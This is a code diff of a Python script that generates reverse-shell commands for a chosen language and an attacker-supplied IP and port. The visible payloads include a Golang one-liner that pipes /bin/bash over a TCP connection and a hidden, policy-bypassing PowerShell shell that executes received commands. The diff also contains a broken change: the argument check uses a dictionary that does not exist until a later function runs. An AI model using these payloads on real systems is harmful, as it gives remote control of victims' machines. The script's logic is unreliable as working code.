@@ -1,6 +1,6 @@
 #!/bin/env python3                                                                                          
 import sys                                                                                                  
-services = ['awk', 'bash', 'bash-udp', 'c', 'golang', 'java', 'lua', 'lua-all', 'nodejs', 'ncat', 'ncat-udp', 'netcat', 'netcat-busybox', 'netcat-openbsd', 'openssl', 'perl', 'php', 'powershell', 'python', 'python3-windows', 'python2-windows', 'ruby', 'socat', 'telnet', 'windows', 'xterm']
+
 
 
 def help():                                                   
@@ -22,7 +22,7 @@ python3-windows    python2-windows""")
 
 def parser():                                                 
         try:                                                        
-                if sys.argv[1] not in services:                                
+                if sys.argv[1] not in service_commands:                                
                         help()                                                
                
                 service = sys.argv[1]
@@ -36,7 +36,8 @@ def parser():
    
 
 
-def command(s, ip, port):     
+def command(s, ip, port):  
+        global service_commands   
         service_commands = {
                 "golang":     'echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","' + ip +':' + port + '");cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go',
                 "powershell": 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("' + ip + '",' + port + ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' , 
